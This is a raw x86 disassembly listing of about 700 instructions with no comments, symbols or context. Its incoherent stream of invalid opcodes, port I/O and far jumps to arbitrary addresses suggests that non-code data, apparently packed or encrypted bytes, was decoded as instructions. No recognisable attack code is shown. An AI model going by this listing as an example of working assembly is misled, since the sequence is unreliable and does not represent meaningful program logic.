  410d29:	outs   dx,BYTE PTR ds:[esi]
  410d2a:	lods   al,BYTE PTR ds:[esi]
  410d2b:	pop    edi
  410d2c:	stos   BYTE PTR es:[edi],al
  410d2d:	dec    ecx
  410d2e:	loope  0x410ce5
  410d30:	fwait
  410d31:	shl    BYTE PTR [eax],1
  410d33:	push   ebx
  410d34:	push   eax
  410d35:	fdivr  st,st(3)
  410d37:	mov    al,ds:0x5446f74f
  410d3c:	mov    ch,0x27
  410d3e:	xor    edx,edi
  410d40:	xchg   ebx,eax
  410d41:	inc    eax
  410d43:	xchg   ebx,eax
  410d44:	jmp    0x410d0b
  410d46:	pusha  
  410d47:	sub    ch,BYTE PTR [ebx-0x28]
  410d4a:	imul   edi,DWORD PTR [edi+eiz*8],0xdb7b8931
  410d51:	lods   eax,DWORD PTR ds:[esi]
  410d52:	cmc    
  410d53:	in     eax,dx
  410d54:	xor    eax,0xfea01e7
  410d59:	jmp    0x410dd6
  410d5b:	dec    esi
  410d5c:	es inc esp
  410d5e:	inc    edi
  410d5f:	push   esi
  410d60:	gs pop ebx
  410d62:	mov    BYTE PTR [edi+0x6f],0x92
  410d66:	cmc    
  410d67:	ins    DWORD PTR es:[edi],dx
  410d68:	and    eax,0x23c8bbe1
  410d6d:	inc    esi
  410d6e:	add    al,0x98
  410d70:	push   0x9707be3
  410d75:	jmp    0x410dee
  410d77:	(bad)  
  410d78:	test   DWORD PTR [ecx+0x17],0xd165abe2
  410d7f:	cld    
  410d80:	dec    ebx
  410d81:	fs out 0xf3,eax
  410d84:	ss sti 
  410d86:	jns    0x410d69
  410d88:	xchg   ebp,eax
  410d89:	push   edx
  410d8a:	arpl   WORD PTR [eax+0x5d985022],sp
  410d90:	dec    eax
  410d91:	retf   0x153a
  410d94:	adc    ecx,edx
  410d96:	push   cs
  410d97:	lds    eax,FWORD PTR [eax+0x3e]
  410d9a:	mov    eax,0xbb64c22c
  410d9f:	jbe    0x410ded
  410da1:	fistp  DWORD PTR [ebx]
  410da4:	jmp    0x4c95:0x5c2f95f5
  410dab:	inc    esp
  410dac:	lods   eax,DWORD PTR ds:[esi]
  410dad:	loop   0x410d8d
  410daf:	sub    esi,edx
  410db1:	fimul  DWORD PTR [ebp+eax*8+0x3a787d6e]
  410db8:	into   
  410db9:	push   es
  410dba:	jns    0x410dc4
  410dbc:	fcom   DWORD PTR [ebp-0x7b8d5e56]
  410dc2:	mov    ah,0xaa
  410dc4:	pop    ebx
  410dc5:	ret    
  410dc6:	mov    dh,0x25
  410dc8:	ins    BYTE PTR es:[edi],dx
  410dc9:	mov    ah,0x49
  410dcb:	and    al,0xc8
  410dcd:	jge    0x410dbc
  410dcf:	cmp    ebx,ecx
  410dd1:	rol    BYTE PTR [ecx+0x8],cl
  410dd4:	jnp    0x410e1b
  410dd6:	push   es
  410dd7:	xchg   ecx,eax
  410dd8:	cmp    eax,0x84305c8d
  410ddd:	int    0x85
  410ddf:	rcl    bl,cl
  410de1:	js     0x410dde
  410de3:	aam    0x3e
  410de5:	pusha  
  410de6:	xchg   dl,cl
  410de8:	popa   
  410de9:	lods   eax,DWORD PTR ds:[esi]
  410dea:	dec    ebp
  410deb:	mov    edx,DWORD PTR [edx+0x3a]
  410dee:	sbb    cl,cl
  410df0:	imul   edi,DWORD PTR [ebp+ebp*4-0x80],0x5
  410df5:	das    
  410df6:	pushf  
  410df7:	fcomp  QWORD PTR fs:[edi+eax*1-0x70f6d8b4]
  410dff:	push   0x59
  410e01:	rcr    DWORD PTR [edx],1
  410e03:	lods   eax,DWORD PTR ds:[esi]
  410e04:	inc    ebp
  410e05:	sbb    cl,BYTE PTR [ebx-0x3aa38864]
  410e0b:	sbb    DWORD PTR [ebx+ebp*4-0x1a1fe081],0xf0581cf0
  410e16:	and    DWORD PTR [eax+0x28],0x156162eb
  410e1d:	add    al,0x6d
  410e1f:	xchg   esi,eax
  410e20:	cld    
  410e21:	pop    esp
  410e22:	sbb    ebx,ebx
  410e24:	jmp    0x222789dd
  410e29:	ja     0x410dbe
  410e2b:	mov    esp,0xc08a9cca
  410e30:	mov    eax,0xd3da9bc8
  410e35:	xchg   esp,eax
  410e36:	sar    DWORD PTR [ecx+0xd],0x3a
  410e3a:	ins    BYTE PTR es:[edi],dx
  410e3b:	jg     0x410e1e
  410e3d:	sbb    eax,0x928953c1
  410e42:	pop    ds
  410e43:	mov    ss,WORD PTR [ecx]
  410e45:	xchg   edi,eax
  410e46:	pop    esi
  410e47:	xchg   ecx,eax
  410e48:	pop    esp
  410e49:	fbstp  TBYTE PTR [ebp-0x31]
  410e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e4d:	mov    edx,0x520ac2a6
  410e52:	and    al,0x39
  410e54:	loop   0x410e54
  410e56:	in     al,0xb1
  410e58:	psubsb mm3,QWORD PTR [edx-0x4e3e7c1b]
  410e5f:	pop    ds
  410e60:	and    edx,DWORD PTR [ecx+0x1635ded6]
  410e66:	pop    edx
  410e67:	pop    eax
  410e68:	cs mov edi,0x262522
  410e6e:	data16 and cl,BYTE PTR [ebp-0x2c2376b1]
  410e75:	cmp    esi,DWORD PTR [eax]
  410e77:	cwde   
  410e78:	fldcw  WORD PTR [edx+edi*4+0x30]
  410e7c:	lock xchg ebx,eax
  410e7e:	fist   DWORD PTR [ecx+0x59e4c185]
  410e84:	inc    ebx
  410e85:	add    eax,0x8b9c7a2a
  410e8a:	lea    esi,[ebx+0x3bdbe124]
  410e90:	clc    
  410e91:	in     eax,0xfd
  410e93:	push   cs
  410e94:	xor    al,0x71
  410e96:	lods   eax,DWORD PTR ds:[esi]
  410e97:	in     al,dx
  410e98:	mov    al,ds:0x10165858
  410e9d:	fcom   st(0)
  410e9f:	push   ecx
  410ea0:	xor    ecx,DWORD PTR [ecx+0x65e81c7b]
  410ea6:	mov    al,ds:0x3134b2b7
  410eab:	jbe    0x410e4d
  410ead:	retf   0xb538
  410eb0:	in     eax,dx
  410eb1:	pop    ebp
  410eb2:	outs   dx,DWORD PTR ds:[esi]
  410eb3:	ds dec esi
  410eb5:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  410eb7:	push   eax
  410eb8:	mov    ds:0xb28c2154,al
  410ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ebe:	add    al,ch
  410ec0:	stos   DWORD PTR es:[edi],eax
  410ec1:	popf   
  410ec2:	and    al,0x4f
  410ec4:	pop    ecx
  410ec5:	(bad)  
  410ec6:	gs mov edx,0xf10e585e
  410ecc:	jne    0x410e84
  410ece:	stos   BYTE PTR es:[edi],al
  410ecf:	outs   dx,DWORD PTR ds:[esi]
  410ed0:	stc    
  410ed1:	cld    
  410ed2:	clc    
  410ed3:	push   ebp
  410ed4:	mov    ecx,eax
  410ed6:	cmp    al,0x3
  410ed8:	adc    BYTE PTR [esi+ebx*2],dh
  410edb:	jmp    0x50c4:0x6e373581
  410ee2:	and    al,0xc8
  410ee4:	icebp  
  410ee5:	loopne 0x410ed3
  410ee7:	and    al,0xf9
  410ee9:	xchg   ebp,eax
  410eea:	jno    0x410efa
  410eec:	jge    0x410e80
  410eee:	dec    edx
  410eef:	std    
  410ef0:	mov    BYTE PTR [eax],dl
  410ef2:	xchg   edx,eax
  410ef3:	ss addr16 inc ecx
  410ef6:	mov    al,ds:0x3c1da70f
  410efb:	mov    WORD PTR [ecx],?
  410efd:	fwait
  410efe:	cmp    eax,0xd70d32c5
  410f03:	iret   
  410f04:	outs   dx,BYTE PTR ds:[esi]
  410f05:	shld   edx,esi,cl
  410f08:	scas   eax,DWORD PTR es:[edi]
  410f09:	and    DWORD PTR [eax-0x8],0x5e
  410f0d:	jo     0x410f3a
  410f0f:	test   BYTE PTR ds:0xf4850276,0xdc
  410f16:	in     al,0x3f
  410f18:	jmp    0x7af22227
  410f1d:	iret   
  410f1e:	sbb    edi,DWORD PTR ds:0xa004417b
  410f24:	(bad)  
  410f25:	inc    ebx
  410f26:	xlat   BYTE PTR ds:[ebx]
  410f27:	mov    esi,0x44655d6b
  410f2c:	xor    DWORD PTR [ebx+0x2e],edi
  410f2f:	jmp    0x410f9b
  410f31:	out    dx,eax
  410f32:	xchg   ebp,eax
  410f33:	push   es
  410f34:	loopne 0x410f0c
  410f36:	fisub  DWORD PTR [esi]
  410f38:	je     0x410f07
  410f3a:	sbb    al,0x62
  410f3c:	test   al,ah
  410f3e:	imul   ecx,DWORD PTR [ecx+edx*2],0x182d3d66
  410f45:	mov    edx,0x47d611
  410f4a:	test   ah,bh
  410f4c:	test   al,0xd
  410f4e:	cs pop esp
  410f50:	jmp    0x44f7:0xe95cdcca
  410f57:	add    al,0x37
  410f59:	daa    
  410f5a:	add    al,ah
  410f5c:	das    
  410f5d:	mov    edx,0x2838deec
  410f62:	xor    eax,edx
  410f64:	std    
  410f65:	adc    al,0x11
  410f67:	mov    dl,0xa3
  410f69:	mov    esi,DWORD PTR [ebx-0x5b]
  410f6c:	mov    ecx,esp
  410f6e:	jg     0x410f33
  410f70:	or     BYTE PTR [edx+0x5a144b66],al
  410f76:	mov    bl,BYTE PTR [edi-0x6a]
  410f79:	prefetcht0 BYTE PTR [ebp+0x4530714d]
  410f80:	sti    
  410f81:	adc    BYTE PTR [ebx-0x67fdcedc],bl
  410f87:	cmp    edi,DWORD PTR [edx]
  410f89:	mov    edx,0x8fdbe23c
  410f8e:	stos   DWORD PTR es:[edi],eax
  410f8f:	aaa    
  410f90:	push   esi
  410f91:	adc    DWORD PTR [ecx-0x17b33c61],edi
  410f97:	add    DWORD PTR [ebx],edi
  410f99:	fstp   QWORD PTR [edx-0x1afe5b6c]
  410f9f:	(bad)  
  410fa0:	pop    edx
  410fa1:	daa    
  410fa2:	mov    bh,0x95
  410fa4:	outs   dx,DWORD PTR ds:[esi]
  410fa5:	les    ebp,FWORD PTR [ebp+0x48]
  410fa8:	push   cs
  410fa9:	push   0xd829b8cf
  410fae:	xchg   ebp,eax
  410faf:	ror    BYTE PTR [esp+ecx*2-0x40f1dc23],cl
  410fb6:	xor    eax,0xbf4cd131
  410fbb:	out    dx,eax
  410fbc:	push   es
  410fbd:	jg     0x410f5d
  410fbf:	ja     0x410fc7
  410fc1:	(bad)  
  410fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fc4:	inc    esp
  410fc5:	inc    edi
  410fc6:	pop    ss
  410fc7:	shr    BYTE PTR gs:[ecx-0x1d],1
  410fcb:	test   BYTE PTR [ebx],dh
  410fcd:	pop    ds
  410fce:	out    0x98,eax
  410fd0:	das    
  410fd1:	popf   
  410fd2:	mov    bl,0x98
  410fd4:	inc    eax
  410fd5:	inc    eax
  410fd6:	xor    DWORD PTR [ecx],eax
  410fd8:	shl    DWORD PTR [ebx-0x3e5f3c54],1
  410fde:	in     eax,dx
  410fdf:	jno    0x410fdf
  410fe1:	xchg   edx,eax
  410fe2:	push   ecx
  410fe3:	mov    bl,0xb4
  410fe5:	sub    edi,DWORD PTR [eax+0x655cc17f]
  410feb:	inc    eax
  410fec:	xchg   esi,eax
  410fed:	push   ebx
  410fee:	inc    edx
  410fef:	push   ss
  410ff0:	xchg   esp,eax
  410ff1:	int3   
  410ff2:	imul   dl
  410ff4:	mov    BYTE PTR [ebx-0x3cf85c0d],dh
  410ffa:	bound  ecx,QWORD PTR [eax]
  410ffc:	pop    DWORD PTR [ebp+0x32bd0efc]
  411002:	cld    
  411003:	punpckhwd mm1,QWORD PTR [eax+0x4584e355]
  41100a:	inc    edi
  41100b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41100c:	xchg   ebp,eax
  41100d:	and    ebx,DWORD PTR [edi]
  41100f:	push   0x3ebd6b8e
  411014:	loope  0x411012
  411016:	mov    ecx,0x1ea4c454
  41101b:	sahf   
  41101c:	mov    ebp,0xcd4a36e9
  411021:	cld    
  411022:	pop    ss
  411023:	cmp    al,0x34
  411025:	push   ds
  411026:	fldcw  WORD PTR cs:[esi+0x1eeab3d]
  41102d:	mul    BYTE PTR ds:0xbb226675
  411033:	fimul  DWORD PTR ds:0x10bb76c3
  411039:	test   BYTE PTR [edx],ah
  41103b:	sar    DWORD PTR [eax-0x59],1
  41103e:	stos   DWORD PTR es:[edi],eax
  41103f:	clc    
  411040:	and    bl,BYTE PTR [edx]
  411042:	test   DWORD PTR [edx-0x4a2b48cc],0x24d91eb5
  41104c:	or     eax,ebp
  41104e:	jae    0x4110ad
  411050:	es (bad) 
  411052:	fdiv   DWORD PTR [ebx-0x6b72d097]
  411058:	adc    eax,0x375c0085
  41105d:	clc    
  41105e:	mov    ecx,0x2f4302b9
  411063:	ss es (bad) 
  411066:	out    dx,al
  411067:	pop    ds
  411068:	out    0x93,eax
  41106a:	lods   al,BYTE PTR ds:[esi]
  41106b:	sbb    BYTE PTR [edx],dl
  41106d:	mov    ecx,0xd9063056
  411072:	jmp    0x7826:0xdabef418
  411079:	in     eax,dx
  41107a:	int    0xa0
  41107c:	fwait
  41107d:	and    DWORD PTR [ebx],ebp
  41107f:	cdq    
  411080:	cdq    
  411081:	push   eax
  411082:	inc    ebp
  411083:	fdivrp st(5),st
  411085:	icebp  
  411086:	and    eax,0xe51638b7
  41108b:	not    ah
  41108d:	loop   0x41102e
  41108f:	jno    0x41105d
  411091:	mov    edx,0x5d4d32f
  411096:	cmp    DWORD PTR [esi+edi*1],esp
  411099:	mov    esi,0x6d31dfa
  41109e:	adc    eax,0xcac17316
  4110a3:	scas   eax,DWORD PTR es:[edi]
  4110a4:	dec    esp
  4110a5:	cli    
  4110a6:	in     eax,0xbc
  4110a8:	jo     0x4110af
  4110aa:	or     eax,0xc056ad5e
  4110af:	test   dl,bl
  4110b1:	(bad)  
  4110b2:	mov    eax,0x3c62f2d0
  4110b7:	sbb    ecx,esi
  4110b9:	fidivr DWORD PTR [edi-0x7c]
  4110bc:	scas   al,BYTE PTR es:[edi]
  4110bd:	pop    ecx
  4110be:	xor    DWORD PTR [ebp+0xa14e846],esi
  4110c4:	shl    bh,1
  4110c6:	ins    BYTE PTR es:[edi],dx
  4110c7:	adc    eax,0xef6eadc2
  4110cc:	or     BYTE PTR [edi+0x5b0adf7],bh
  4110d2:	outs   dx,DWORD PTR ds:[esi]
  4110d3:	ja     0x4110a2
  4110d5:	push   esi
  4110d6:	sahf   
  4110d7:	imul   edx,DWORD PTR [ebx+ebp*8+0x45],0x91438c8f
  4110df:	xor    al,0x62
  4110e1:	neg    DWORD PTR [edx-0x7023272f]
  4110e7:	mov    ebx,0xaba0252
  4110ec:	xchg   ecx,eax
  4110ed:	ins    BYTE PTR es:[edi],dx
  4110ee:	xchg   DWORD PTR [esi+eiz*4+0x77e2d457],esi
  4110f5:	cmp    cl,bl
  4110f7:	repnz or ah,BYTE PTR [edx+0x3f]
  4110fb:	es mov edx,0x8cb54835
  411101:	jns    0x411147
  411103:	push   esi
  411104:	sub    eax,0x8e5a7b90
  411109:	and    eax,0x854bb428
  41110e:	mov    esi,0x45de7542
  411114:	jge    0x411164
  411116:	mov    esp,0xe0778de4
  41111b:	jmp    0x4110c8
  41111d:	fisub  DWORD PTR [esi-0x3514804f]
  411123:	mov    edx,0xc5a6d10d
  411128:	fnstenv [edi-0x1e]
  41112b:	iret   
  41112c:	(bad)  
  41112d:	mov    edx,0x9ae65016
  411132:	repz cld 
  411134:	pop    es
  411135:	icebp  
  411136:	das    
  411137:	outs   dx,BYTE PTR ds:[esi]
  411138:	nop
  411139:	lahf   
  41113a:	lahf   
  41113b:	fbld   TBYTE PTR [edx-0x5d]
  41113e:	ins    BYTE PTR es:[edi],dx
  41113f:	sbb    ebp,DWORD PTR [ebx]
  411141:	xchg   ebp,eax
  411142:	pop    es
  411143:	(bad)  
  411144:	inc    DWORD PTR [eax+edi*2-0x6b01f4d8]
  41114b:	int    0xae
  41114d:	loop   0x411114
  41114f:	aas    
  411150:	enter  0x9cdb,0x36
  411154:	loope  0x411155
  411156:	push   ecx
  411157:	cdq    
  411158:	push   ds
  411159:	xlat   BYTE PTR ds:[ebx]
  41115a:	(bad)  
  41115b:	sbb    ebx,DWORD PTR [ebx]
  41115d:	out    0x3a,al
  41115f:	xchg   ecx,eax
  411160:	stos   DWORD PTR es:[edi],eax
  411161:	sub    eax,0x30953f7b
  411166:	sbb    al,0xe
  411168:	push   edx
  411169:	mov    dl,0x45
  41116b:	xchg   edx,eax
  41116c:	arpl   ax,sp
  41116e:	push   ebp
  41116f:	cmp    DWORD PTR [edx+0x72],esp
  411172:	leave  
  411173:	inc    eax
  411174:	ja     0x411176
  411176:	jge    0x4111e4
  411178:	inc    ecx
  411179:	or     eax,0xc04849c6
  41117e:	push   eax
  41117f:	xchg   esp,eax
  411180:	xadd   BYTE PTR [edi-0x5a],ah
  411184:	cdq    
  411185:	aaa    
  411186:	dec    ebp
  411187:	and    al,0x45
  411189:	test   eax,0xafbafe2f
  41118e:	arpl   WORD PTR [edi-0x1d],sp
  411191:	xor    edx,ebx
  411193:	js     0x411203
  411195:	fdiv   DWORD PTR [eax-0x7c]
  411198:	test   DWORD PTR [edx+eiz*2-0x26b94470],esp
  41119f:	fwait
  4111a0:	inc    edi
  4111a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111a2:	mov    ecx,0x326840f9
  4111a7:	pop    es
  4111a8:	fisub  DWORD PTR [edx-0x72b2a573]
  4111ae:	outs   dx,BYTE PTR ds:[esi]
  4111af:	adc    DWORD PTR [edx],ebp
  4111b1:	ss jb  0x41118e
  4111b4:	test   al,0xb7
  4111b6:	(bad)
  4111ba:	xor    al,BYTE PTR [ebx-0x76]
  4111bd:	push   edi
  4111be:	fstp   st(3)
  4111c0:	sbb    al,bh
  4111c2:	(bad)  
  4111c3:	sbb    eax,0xaa7eb9ea
  4111c8:	mov    edi,0xc2b1f04d
  4111cd:	int    0x5d
  4111cf:	lods   al,BYTE PTR ds:[esi]
  4111d0:	dec    edi
  4111d1:	mov    esp,0xe71a86ce
  4111d6:	mov    dl,0x74
  4111d8:	xchg   esi,eax
  4111d9:	cmp    dl,BYTE PTR [edi+ecx*1-0x4b]
  4111dd:	lods   eax,DWORD PTR ds:[esi]
  4111de:	sbb    eax,0x8cf91668
  4111e3:	or     DWORD PTR [ebx+0x7a],0xffffffd5
  4111e7:	jp     0x41120c
  4111e9:	call   0x3ca3:0x8e0461dc
  4111f0:	jmp    0xcb424eb0
  4111f5:	sub    ch,bl
  4111f7:	fdivr  DWORD PTR [ebx+0x4da434a]
  4111fd:	outs   dx,BYTE PTR ds:[esi]
  4111fe:	push   ebp
  4111ff:	fcomp  DWORD PTR [ecx+0x5d]
  411202:	pop    esi
  411203:	(bad)  
  411204:	loopne 0x411271
  411206:	xor    dl,BYTE PTR [edx-0x5f30dd52]
  41120c:	psubb  mm3,mm0
  41120f:	(bad)  
  411210:	push   ecx
  411211:	in     eax,dx
  411212:	adc    ebx,ebp
  411214:	lds    ebx,FWORD PTR [esi-0x26]
  411217:	(bad)  
  411218:	push   esi
  411219:	and    bh,BYTE PTR [ebp+ecx*8+0x23]
  41121d:	mov    esi,0xda1875de
  411222:	in     al,dx
  411223:	bound  ebp,QWORD PTR [ebx]
  411225:	loope  0x4111cc
  411227:	cmp    edx,esp
  411229:	jo     0x4111ce
  41122b:	lods   al,BYTE PTR ds:[esi]
  41122c:	xchg   DWORD PTR [ebp-0x3b24d658],edx
  411232:	leave  
  411233:	or     DWORD PTR [ebx-0x6],ecx
  411236:	inc    edi
  411237:	jns    0x4111f5
  411239:	aam    0xfa
  41123b:	test   BYTE PTR [eax-0x5b],cl
  41123e:	inc    eax
  41123f:	outs   dx,BYTE PTR ds:[esi]
  411240:	mov    DWORD PTR [ebx+ebx*1+0x3a],eax
  411244:	cmc    
  411245:	xchg   esp,eax
  411246:	sbb    DWORD PTR [ebx],edi
  411248:	xor    eax,0xb39a9422
  41124d:	imul   esp,DWORD PTR [eax+0x927f738],0x18
  411254:	dec    ebx
  411255:	adc    edx,DWORD PTR [ebp-0x36e26365]
  41125b:	push   edx
  41125c:	rcr    BYTE PTR [ebx],cl
  41125e:	fild   WORD PTR [esi+0x34]
  411261:	add    al,0x36
  411263:	scas   al,BYTE PTR es:[edi]
  411264:	and    eax,0xfe124801
  411269:	push   esp
  41126a:	add    DWORD PTR [ecx+0x31],0x6f39384c
  411271:	mov    ecx,0x8e67ac92
  411276:	adc    dl,0x2d
  411279:	dec    edx
  41127a:	mov    dl,0xe3
  41127c:	sub    BYTE PTR [edi-0x53],0x86
  411280:	dec    esi
  411281:	repnz inc edi
  411283:	pop    edx
  411284:	loop   0x4112b4
  411286:	push   0x5
  411288:	jl     0x4112ad
  41128a:	pop    esi
  41128b:	js     0x411293
  41128d:	sbb    BYTE PTR [eax+0x2959ac1e],dl
  411293:	jnp    0x41128b
  411295:	or     DWORD PTR [ebp+0x3d],0xffffffd9
  411299:	xchg   BYTE PTR [eax+ecx*4],dl
  41129c:	sub    DWORD PTR [edx],eax
  41129e:	pop    ebp
  41129f:	cmp    ah,dl
  4112a1:	loope  0x411285
  4112a3:	sub    al,0xbd
  4112a5:	aas    
  4112a6:	std    
  4112a7:	mov    dl,0x37
  4112a9:	mov    dh,0xfd
  4112ab:	adc    esi,DWORD PTR [edx+0x3da8ea83]
  4112b1:	xchg   ch,dh
  4112b3:	adc    eax,0x3248560d
  4112b8:	and    edx,DWORD PTR [edi+0x16]
  4112bb:	pop    es
  4112bc:	imul   eax,DWORD PTR [ebp+0x6c],0x42
  4112c0:	add    al,BYTE PTR ds:0x822514a2
  4112c6:	sub    esp,DWORD PTR [ebx]
  4112c8:	jnp    0x4112e9
  4112ca:	sub    dl,BYTE PTR [eax+0x472cc1ab]
  4112d0:	stos   DWORD PTR es:[edi],eax
  4112d1:	daa    
  4112d2:	repnz mov cs,WORD PTR [esi+edx*1+0x2f]
  4112d7:	pop    esi
  4112d8:	push   esi
  4112d9:	pop    ecx
  4112da:	(bad)  
  4112db:	pop    esi
  4112dc:	sub    eax,0xc2c5a1ab
  4112e1:	cmp    al,0x78
  4112e3:	sub    DWORD PTR [edx-0x3deb8509],esp
  4112e9:	jl     0x41133b
  4112eb:	scas   al,BYTE PTR es:[edi]
  4112ec:	in     al,dx
  4112ed:	loopne 0x411356
  4112ef:	arpl   WORD PTR [edi+edi*4+0x7f65e9a9],sp
  4112f6:	xor    ecx,ebx
  4112f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112f9:	outs   dx,DWORD PTR ds:[esi]
  4112fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112fb:	dec    edx
  4112fc:	shl    esp,cl
  4112fe:	xor    DWORD PTR [ebx+0x431661ea],edi
  411304:	(bad)  
  411305:	mov    ah,0xbd
  411307:	lock leave 
  411309:	ret    0x4ad0
  41130c:	pop    eax
  41130d:	or     dh,BYTE PTR [ecx-0x57]
  411310:	int    0xbe
  411312:	dec    edi
  411313:	jmp    0xd957d101
  411318:	loop   0x41129f
  41131a:	mov    ds:0x465b9a12,eax
  41131f:	shl    BYTE PTR [edx+0x68],1
  411322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411323:	xchg   esp,eax
  411324:	arpl   WORD PTR [eax+0x6890a05a],di
  41132a:	ss ins DWORD PTR es:[edi],dx
  41132c:	pop    es
  41132d:	xor    al,ah
  41132f:	mov    al,0x12
  411331:	stc    
  411332:	and    DWORD PTR fs:[edx+0x53847e35],edi
  411339:	icebp  
  41133a:	xchg   edx,eax
  41133b:	mov    edi,0xf05b1825
  411340:	xor    eax,0x879a10ed
  411345:	xchg   edx,eax
  411346:	xchg   ebp,eax
  411347:	lahf   
  411348:	pop    edi
  411349:	sub    al,0xe8
  41134b:	pop    esi
  41134c:	xchg   ebx,eax
  41134d:	xchg   ebx,eax
  41134e:	dec    eax
  41134f:	xchg   esp,eax
  411350:	fwait
  411351:	lods   eax,DWORD PTR ds:[esi]
  411352:	sub    ch,bh
  411354:	imul   ebp,DWORD PTR [eax-0x6e],0x58
  411358:	sbb    dl,bh
  41135a:	mov    ebp,0xdcd09596
  41135f:	ficom  WORD PTR [edi+edi*8-0x7c]
  411363:	mov    edi,0x24950942
  411368:	or     edi,DWORD PTR [edi]
  41136a:	call   0x101e:0x65f90971
  411371:	je     0x41131b
  411373:	fs mov edx,0x1d4ec7d9
  411379:	adc    ch,BYTE PTR [eax+0x7d]
  41137c:	mov    ebp,0x5fdd5645
  411381:	mov    bl,0xf5
  411383:	jl     0x41130f
  411385:	jmp    0x4113a7
  411387:	inc    esi
  411388:	adc    eax,DWORD PTR [edi-0x2d]
  41138b:	jae    0x4113a4
  41138d:	or     bh,BYTE PTR [ebx-0x66]
  411390:	and    al,bl
  411392:	jecxz  0x41133b
  411394:	out    0x41,eax
  411396:	jl     0x41136e
  411398:	das    
  411399:	adc    al,0x78
  41139b:	scas   eax,DWORD PTR es:[edi]
  41139c:	sbb    BYTE PTR [edi-0x3d01e82b],cl
  4113a2:	ret    
  4113a3:	shr    BYTE PTR [ebp+0x2a1f832f],0x87
  4113aa:	test   DWORD PTR [edi+0x3a],ebx
  4113ad:	add    DWORD PTR [ecx-0xb18d7e3],ebp
  4113b3:	int    0xda
  4113b5:	(bad)  
  4113b6:	cmp    ebx,esi
  4113b8:	push   ebp
  4113b9:	test   eax,0x669ac389
  4113be:	xchg   ebp,eax
  4113bf:	and    DWORD PTR [edx],ebp
  4113c1:	mov    ebx,0x90c18798
  4113c6:	push   edx
  4113c7:	or     dl,BYTE PTR [ebx-0x38]
  4113ca:	fs dec edi
  4113cc:	das    
  4113cd:	or     ecx,DWORD PTR [ebx-0x8e38234]
  4113d3:	imul   eax,ebx,0xffffffba
  4113d6:	dec    ecx
  4113d7:	daa    
  4113d8:	xchg   ecx,eax
  4113d9:	call   0xa82d9868
  4113de:	std    
  4113df:	inc    esi
  4113e0:	or     cl,BYTE PTR [esi]
  4113e2:	mov    bl,0xf9
  4113e4:	cmp    ebp,DWORD PTR [ebp-0x7f7a092e]
  4113ea:	inc    esi
  4113eb:	or     bl,BYTE PTR [edi+0x205e1e1]
  4113f1:	pushf  
  4113f2:	test   eax,0xe109ef2a
  4113f7:	sbb    BYTE PTR [ebx+0xd],0xe7
  4113fb:	out    0xe6,eax
  4113fd:	add    edx,edx
  4113ff:	stos   BYTE PTR es:[edi],al
  411400:	xchg   ecx,eax
  411401:	or     ecx,0xfffffffc
  411404:	mov    edx,DWORD PTR [edi+0x2642d906]
  41140a:	dec    esi
  41140b:	mov    edx,0x7eef2630
  411410:	mov    WORD PTR [ebx+0x4054d691],fs
  411416:	push   es
  411417:	daa    
  411418:	(bad)  
  411419:	in     al,dx
  41141a:	stos   DWORD PTR es:[edi],eax
  41141b:	cmc    
  41141c:	dec    edi
  41141d:	cmp    eax,0x2c91f707
  411422:	lahf   
  411423:	sub    esp,DWORD PTR ds:0xb2768e56
  411429:	jne    0x41143f
  41142b:	outs   dx,DWORD PTR ds:[esi]
  41142c:	pop    eax
  41142d:	sbb    esi,DWORD PTR [eax-0x4d2670a5]
  411433:	pop    ds
  411434:	out    dx,al
  411435:	imul   esi,DWORD PTR [esi],0xb3407e85
  41143b:	in     eax,dx
  41143c:	xlat   BYTE PTR ds:[ebx]
  41143d:	jnp    0x4114ad
  41143f:	adc    cl,dl
  411441:	jp     0x411467
  411443:	div    dh
  411445:	cs mov cl,0xfc
  411448:	pushf  
  411449:	or     al,bl
  41144b:	js     0x411417
  41144d:	fbstp  TBYTE PTR [ecx+esi*8-0x56]
  411451:	adc    DWORD PTR [ebp-0x2a2487ab],eax
  411457:	and    BYTE PTR [esi+0x49872dda],0x52
  41145e:	lahf   
  41145f:	jae    0x4114a3
  411461:	daa    
  411462:	jp     0x4114a1
  411464:	test   dl,bh
  411466:	xchg   BYTE PTR [eax-0xc704e84],dl
  41146c:	cs aam 0x62
  41146f:	push   0xc7a790b0
  411474:	pushf  
  411475:	dec    edi
  411476:	xor    ch,dl
  411478:	xchg   ebx,eax
  411479:	pop    esi
  41147a:	aam    0x67
  41147c:	int3   
  41147d:	aas    
  41147e:	dec    ebx
  41147f:	jns    0x411496
  411481:	jb     0x4114e6
  411483:	mov    DWORD PTR [edx],ebx
  411485:	or     eax,0xaa2f9d6c
  41148a:	stc    
  41148b:	push   ss
  41148c:	mov    ah,0xd1
  41148e:	xchg   ecx,eax
  41148f:	inc    ebp
  411490:	(bad)  
  411491:	adc    eax,0xd6b5ffc5
  411496:	ja     0x411481
  411498:	mov    ah,0xa5
  41149a:	rol    DWORD PTR [ebx+ebx*1+0x38f87542],cl
  4114a1:	test   DWORD PTR [edx],ecx
  4114a3:	ss sbb al,0xa2
  4114a6:	xor    ah,BYTE PTR [eax]
  4114a8:	add    al,0xc9
  4114aa:	sub    al,0x43
  4114ac:	xchg   edi,eax
  4114ad:	repnz push esi
  4114af:	mov    dh,0x4
  4114b1:	or     BYTE PTR [ebx-0x75],al
  4114b4:	pop    ss
  4114b5:	cmc    
  4114b6:	cdq    
  4114b7:	(bad)  
  4114b8:	cs dec ebx
  4114ba:	outs   dx,BYTE PTR ds:[esi]
  4114bb:	icebp  
  4114bc:	cld    
  4114bd:	daa    
  4114be:	mov    ah,0xf2
  4114c0:	lea    edi,[ebx-0x14]
  4114c3:	stc    
  4114c4:	mov    ch,BYTE PTR [edx-0x2f]
  4114c7:	cwde   
  4114c8:	shl    dl,0x45
  4114cb:	gs ins DWORD PTR es:[edi],dx
  4114cd:	mov    ebp,0x8c95dc26
  4114d2:	adc    BYTE PTR [esi-0x37],bl
  4114d5:	aad    0xa8
  4114d7:	rol    DWORD PTR [edi],0xef
